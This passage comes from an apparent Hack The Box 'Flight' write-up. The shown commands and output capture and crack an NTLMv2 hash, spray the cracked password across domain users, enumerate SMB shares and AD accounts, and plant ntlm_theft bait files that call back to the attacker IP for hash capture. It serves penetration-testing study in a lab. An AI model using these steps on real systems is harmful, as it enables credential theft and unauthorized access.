+    Responder Machine Name     [WIN-1LRMZ9NX1QB]
+    Responder Domain Name      [QDQ1.LOCAL]
+    Responder DCE-RPC Port     [47705]
+
+[+] Listening for events...
+
+[HTTP] Sending NTLM authentication request to 10.10.11.187
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:4c0e3ec29ab987cc:E23DE0D314B71E484E63D17E3F31AEA8:010100000000000080705932B07DDB01C07517E395CF5F890000000002000800510044005100310001001E00570049004E002D0031004C0052004D005A0039004E00580031005100420004003400570049004E002D0031004C0052004D005A0039004E0058003100510042002E0051004400510031002E004C004F00430041004C000300140051004400510031002E004C004F00430041004C000500140051004400510031002E004C004F00430041004C000700080080705932B07DDB01060004000200000008003000300000000000000000000000003000001A1EC7812FBF11EDD07C2E7A6304A288C2A0B09CC28EA4DF62E81B9BC70E8D3E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
+</code></pre><h3 id="199d1b9f-8847-801a-a4fb-c6d222c8963d" class="">Let’s decrypt the hash with hashcat</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8043-b201-d1a9347a6a14" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ hashcat -m 5600 hash.txt -a 0 /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11700F @ 2.50GHz, 6925/13915 MB (2048 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+SVC_APACHE::flight:4c0e3ec29ab987cc:e23de0d314b71e484e63d17e3f31aea8:010100000000000080705932b07ddb01c07517e395cf5f890000000002000800510044005100310001001e00570049004e002d0031004c0052004d005a0039004e00580031005100420004003400570049004e002d0031004c0052004d005a0039004e0058003100510042002e0051004400510031002e004c004f00430041004c000300140051004400510031002e004c004f00430041004c000500140051004400510031002e004c004f00430041004c000700080080705932b07ddb01060004000200000008003000300000000000000000000000003000001a1ec7812fbf11edd07c2e7a6304a288c2a0b09cc28ea4df62e81b9bc70e8d3e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320033000000000000000000:S@Ss!K@*t13
+</code></pre><h3 id="199d1b9f-8847-8086-a430-cab9ca956583" class="">Enumerating again and try to get a shell</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8025-9c3c-fa17e6ad0d87" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ netexec smb 10.10.11.187 -d flight.htb -u svc_apache -p &#x27;S@Ss!K@*t13&#x27; --rid-brute
+
+SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.10.11.187    445    G0               498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               500: flight\Administrator (SidTypeUser)
+SMB         10.10.11.187    445    G0               501: flight\Guest (SidTypeUser)
+SMB         10.10.11.187    445    G0               502: flight\krbtgt (SidTypeUser)
+SMB         10.10.11.187    445    G0               512: flight\Domain Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               513: flight\Domain Users (SidTypeGroup)
+SMB         10.10.11.187    445    G0               514: flight\Domain Guests (SidTypeGroup)
+SMB         10.10.11.187    445    G0               515: flight\Domain Computers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               516: flight\Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               517: flight\Cert Publishers (SidTypeAlias)
+SMB         10.10.11.187    445    G0               518: flight\Schema Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               519: flight\Enterprise Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               520: flight\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.11.187    445    G0               521: flight\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               522: flight\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               525: flight\Protected Users (SidTypeGroup)
+SMB         10.10.11.187    445    G0               526: flight\Key Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               527: flight\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               553: flight\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.11.187    445    G0               571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.187    445    G0               572: flight\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.187    445    G0               1000: flight\Access-Denied Assistance Users (SidTypeAlias)
+SMB         10.10.11.187    445    G0               1001: flight\G0$ (SidTypeUser)
+SMB         10.10.11.187    445    G0               1102: flight\DnsAdmins (SidTypeAlias)
+SMB         10.10.11.187    445    G0               1103: flight\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.11.187    445    G0               1602: flight\S.Moon (SidTypeUser)
+SMB         10.10.11.187    445    G0               1603: flight\R.Cold (SidTypeUser)
+SMB         10.10.11.187    445    G0               1604: flight\G.Lors (SidTypeUser)
+SMB         10.10.11.187    445    G0               1605: flight\L.Kein (SidTypeUser)
+SMB         10.10.11.187    445    G0               1606: flight\M.Gold (SidTypeUser)
+SMB         10.10.11.187    445    G0               1607: flight\C.Bum (SidTypeUser)
+SMB         10.10.11.187    445    G0               1608: flight\W.Walker (SidTypeUser)
+SMB         10.10.11.187    445    G0               1609: flight\I.Francis (SidTypeUser)
+SMB         10.10.11.187    445    G0               1610: flight\D.Truff (SidTypeUser)
+SMB         10.10.11.187    445    G0               1611: flight\V.Stevens (SidTypeUser)
+SMB         10.10.11.187    445    G0               1612: flight\svc_apache (SidTypeUser)
+SMB         10.10.11.187    445    G0               1613: flight\O.Possum (SidTypeUser)
+SMB         10.10.11.187    445    G0               1614: flight\WebDevs (SidTypeGroup)
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8000-80b4-dd14b7ee6dff" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">                                                                                                                 
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ smbclient -U &#x27;svc_apache&#x27; -L \\10.10.11.187 
+Password for [WORKGROUP\svc_apache]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Shared          Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+	Web             Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8020-8650-e9d0cd9de38b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ impacket-psexec svc_apache:&#x27;S@Ss!K@*t13&#x27;@10.10.11.187                   
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.11.187.....
+[-] share &#x27;ADMIN$&#x27; is not writable.
+[-] share &#x27;C$&#x27; is not writable.
+[-] share &#x27;NETLOGON&#x27; is not writable.
+[-] share &#x27;Shared&#x27; is not writable.
+[-] share &#x27;SYSVOL&#x27; is not writable.
+[-] share &#x27;Users&#x27; is not writable.
+[-] share &#x27;Web&#x27; is not writable.
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8095-8c7f-c54ab1db59ba" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ impacket-GetADUsers -all -dc-ip 10.10.11.187 flight.htb/svc_apache:&#x27;S@Ss!K@*t13&#x27;  
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Querying 10.10.11.187 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+Administrator                                         2022-09-22 15:17:02.343127  2025-02-13 07:02:34.781318 
+Guest                                                 &lt;never&gt;              &lt;never&gt;             
+krbtgt                                                2022-09-22 14:48:01.636722  &lt;never&gt;             
+S.Moon                                                2022-09-22 15:08:22.671163  &lt;never&gt;             
+R.Cold                                                2022-09-22 15:08:22.733765  &lt;never&gt;             
+G.Lors                                                2022-09-22 15:08:22.765944  &lt;never&gt;             
+L.Kein                                                2022-09-22 15:08:22.796386  &lt;never&gt;             
+M.Gold                                                2022-09-22 15:08:22.827653  &lt;never&gt;             
+C.Bum                                                 2022-09-22 15:08:22.858670  2022-09-22 16:50:24.191582 
+W.Walker                                              2022-09-22 15:08:22.889946  &lt;never&gt;             
+I.Francis                                             2022-09-22 15:08:22.921986  &lt;never&gt;             
+D.Truff                                               2022-09-22 15:08:22.952399  &lt;never&gt;             
+V.Stevens                                             2022-09-22 15:08:22.983734  &lt;never&gt;             
+svc_apache                                            2022-09-22 15:08:23.014931  2025-02-13 07:01:59.500062 
+O.Possum                                              2022-09-22 15:08:23.046319  &lt;never&gt;        </code></pre><h3 id="199d1b9f-8847-80c1-9677-fbdd524e6fa4" class="">Got users and access to share files on smb but nothing important</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-80f2-a809-f7c9caf9ae3a" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ smbclient -U &#x27;svc_apache&#x27;  \\\\10.10.11.187\\Users
+Password for [WORKGROUP\svc_apache]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                  DR        0  Thu Sep 22 15:16:56 2022
+  ..                                 DR        0  Thu Sep 22 15:16:56 2022
+  .NET v4.5                           D        0  Thu Sep 22 14:28:03 2022
+  .NET v4.5 Classic                   D        0  Thu Sep 22 14:28:02 2022
+  Administrator                       D        0  Mon Oct 31 13:34:00 2022
+  All Users                       DHSrn        0  Sat Sep 15 02:28:48 2018
+  C.Bum                               D        0  Thu Sep 22 15:08:23 2022
+  Default                           DHR        0  Tue Jul 20 14:20:24 2021
+  Default User                    DHSrn        0  Sat Sep 15 02:28:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 02:16:48 2018
+  Public                             DR        0  Tue Jul 20 14:23:25 2021
+  svc_apache                          D        0  Fri Oct 21 13:50:21 2022
+</code></pre><h3 id="199d1b9f-8847-80c4-bcab-dcc9a86b5a8e" class="">We have all users let’s see if the any user repeat the password → bingoo</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8075-becd-c5201ac9729e" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ netexec smb 10.10.11.187 -d flight.htb -u users.txt -p &#x27;S@Ss!K@*t13&#x27; --rid-brute
+
+SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE
+SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+SMB         10.10.11.187    445    G0               498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               500: flight\Administrator (SidTypeUser)
+SMB         10.10.11.187    445    G0               501: flight\Guest (SidTypeUser)
+SMB         10.10.11.187    445    G0               502: flight\krbtgt (SidTypeUser)
+SMB         10.10.11.187    445    G0               512: flight\Domain Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               513: flight\Domain Users (SidTypeGroup)
+SMB         10.10.11.187    445    G0               514: flight\Domain Guests (SidTypeGroup)
+SMB         10.10.11.187    445    G0               515: flight\Domain Computers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               516: flight\Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               517: flight\Cert Publishers (SidTypeAlias)
+SMB         10.10.11.187    445    G0               518: flight\Schema Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               519: flight\Enterprise Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               520: flight\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.11.187    445    G0               521: flight\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               522: flight\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               525: flight\Protected Users (SidTypeGroup)
+SMB         10.10.11.187    445    G0               526: flight\Key Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               527: flight\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               553: flight\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.11.187    445    G0               571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.187    445    G0               572: flight\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.187    445    G0               1000: flight\Access-Denied Assistance Users (SidTypeAlias)
+SMB         10.10.11.187    445    G0               1001: flight\G0$ (SidTypeUser)
+SMB         10.10.11.187    445    G0               1102: flight\DnsAdmins (SidTypeAlias)
+SMB         10.10.11.187    445    G0               1103: flight\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.11.187    445    G0               1602: flight\S.Moon (SidTypeUser)
+SMB         10.10.11.187    445    G0               1603: flight\R.Cold (SidTypeUser)
+SMB         10.10.11.187    445    G0               1604: flight\G.Lors (SidTypeUser)
+SMB         10.10.11.187    445    G0               1605: flight\L.Kein (SidTypeUser)
+SMB         10.10.11.187    445    G0               1606: flight\M.Gold (SidTypeUser)
+SMB         10.10.11.187    445    G0               1607: flight\C.Bum (SidTypeUser)
+SMB         10.10.11.187    445    G0               1608: flight\W.Walker (SidTypeUser)
+SMB         10.10.11.187    445    G0               1609: flight\I.Francis (SidTypeUser)
+SMB         10.10.11.187    445    G0               1610: flight\D.Truff (SidTypeUser)
+SMB         10.10.11.187    445    G0               1611: flight\V.Stevens (SidTypeUser)
+SMB         10.10.11.187    445    G0               1612: flight\svc_apache (SidTypeUser)
+SMB         10.10.11.187    445    G0               1613: flight\O.Possum (SidTypeUser)
+SMB         10.10.11.187    445    G0               1614: flight\WebDevs (SidTypeGroup)
+</code></pre><h3 id="199d1b9f-8847-80e0-94fc-fbee0b09f158" class="">New creds → S.Moon:S@Ss!K@*t13 </h3><h3 id="199d1b9f-8847-80c4-89d7-c6a1d9b76f68" class="">Let’s enumerate smb with the new user but nothing, now enumerate write permissions over smb</h3><h2 id="199d1b9f-8847-8054-8853-e5ec5d60be0e" class="">Lateral Movement</h2><h3 id="199d1b9f-8847-80e7-8c1d-fa54eb012917" class="">We can write over shared dir, let’s use <a href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a> to create a lot of NTLMv2 hash theft files.</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-80c8-9d4e-e81413a38f27" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight/ntlm_theft]
+└─$ python3 ntlm_theft.py -g all -s 10.10.14.23 -f do_not_click_me                             
+Created: do_not_click_me/do_not_click_me.scf (BROWSE TO FOLDER)
+Created: do_not_click_me/do_not_click_me-(url).url (BROWSE TO FOLDER)
+Created: do_not_click_me/do_not_click_me-(icon).url (BROWSE TO FOLDER)
+Created: do_not_click_me/do_not_click_me.lnk (BROWSE TO FOLDER)
+Created: do_not_click_me/do_not_click_me.rtf (OPEN)
+Created: do_not_click_me/do_not_click_me-(stylesheet).xml (OPEN)
+Created: do_not_click_me/do_not_click_me-(fulldocx).xml (OPEN)
+Created: do_not_click_me/do_not_click_me.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: do_not_click_me/do_not_click_me-(includepicture).docx (OPEN)
+Created: do_not_click_me/do_not_click_me-(remotetemplate).docx (OPEN)
+Created: do_not_click_me/do_not_click_me-(frameset).docx (OPEN)
+Created: do_not_click_me/do_not_click_me-(externalcell).xlsx (OPEN)
+Created: do_not_click_me/do_not_click_me.wax (OPEN)
+Created: do_not_click_me/do_not_click_me.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: do_not_click_me/do_not_click_me.asx (OPEN)
+Created: do_not_click_me/do_not_click_me.jnlp (OPEN)
+Created: do_not_click_me/do_not_click_me.application (DOWNLOAD AND OPEN)
+Created: do_not_click_me/do_not_click_me.pdf (OPEN AND ALLOW)
+Created: do_not_click_me/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: do_not_click_me/Autorun.inf (BROWSE TO FOLDER)
+Created: do_not_click_me/desktop.ini (BROWSE TO FOLDER)
+Generation Complete.
+</code></pre><h3 id="199d1b9f-8847-8036-a3af-f171e1738987" class="">Now upload it on shared file</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8021-8150-e0755b250e52" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/…/.htb/Flight/ntlm_theft/do_not_click_me]
+└─$ smbclient -U &#x27;S.Moon&#x27;  \\\\10.10.11.187\\Shared
+Password for [WORKGROUP\S.Moon]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; mput *
+Put file do_not_click_me.jnlp? y
+putting file do_not_click_me.jnlp as \do_not_click_me.jnlp (0.5 kb/s) (average 0.5 kb/s)
+Put file do_not_click_me.asx? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me.asx
+Put file do_not_click_me.lnk? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me.lnk
+Put file do_not_click_me-(url).url? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me-(url).url
+Put file do_not_click_me-(icon).url? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me-(icon).url
+Put file do_not_click_me-(includepicture).docx? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me-(includepicture).docx
+Put file do_not_click_me.m3u? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me.m3u
+Put file do_not_click_me.rtf? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me.rtf
+Put file do_not_click_me-(remotetemplate).docx? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me-(remotetemplate).docx
+Put file do_not_click_me-(fulldocx).xml? y
+yputting file do_not_click_me-(fulldocx).xml as \do_not_click_me-(fulldocx).xml (116.8 kb/s) (average 73.3 kb/s)
+Put file do_not_click_me-(externalcell).xlsx? 
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me-(externalcell).xlsx
+Put file do_not_click_me-(frameset).docx? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me-(frameset).docx
+Put file do_not_click_me.wax? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me.wax
+Put file zoom-attack-instructions.txt? y
+NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt
+Put file do_not_click_me-(stylesheet).xml? y
+putting file do_not_click_me-(stylesheet).xml as \do_not_click_me-(stylesheet).xml (0.4 kb/s) (average 53.4 kb/s)
+Put file do_not_click_me.scf? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me.scf
+Put file desktop.ini? y
+putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 42.0 kb/s)
+Put file do_not_click_me.htm? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me.htm
+Put file do_not_click_me.pdf? y
+NT_STATUS_ACCESS_DENIED opening remote file \do_not_click_me.pdf
+Put file do_not_click_me.application? y
+putting file do_not_click_me.application as \do_not_click_me.application (4.4 kb/s) (average 35.4 kb/s)
+Put file Autorun.inf? y
+NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf
+smb: \&gt; dir
+  .                                   D        0  Thu Feb 13 09:04:10 2025
+  ..                                  D        0  Thu Feb 13 09:04:10 2025
+  desktop.ini                         A       47  Thu Feb 13 09:03:57 2025
+  do_not_click_me-(fulldocx).xml      A    72585  Thu Feb 13 09:03:50 2025
+  do_not_click_me-(stylesheet).xml      A      163  Thu Feb 13 09:03:55 2025
+  do_not_click_me.application         A     1650  Thu Feb 13 09:04:10 2025
+  do_not_click_me.jnlp                A      192  Thu Feb 13 09:03:40 2025
+</code></pre><h3 id="199d1b9f-8847-8093-94a1-db8c60fc38df" class="">Just wait on responder and got ntlm hash</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-8072-9990-dce4e13db33f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">                                                                                                                 
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ sudo responder -I tun0 -v      
+[sudo] password for drroot: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -&gt; https://github.com/sponsors/lgandx
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
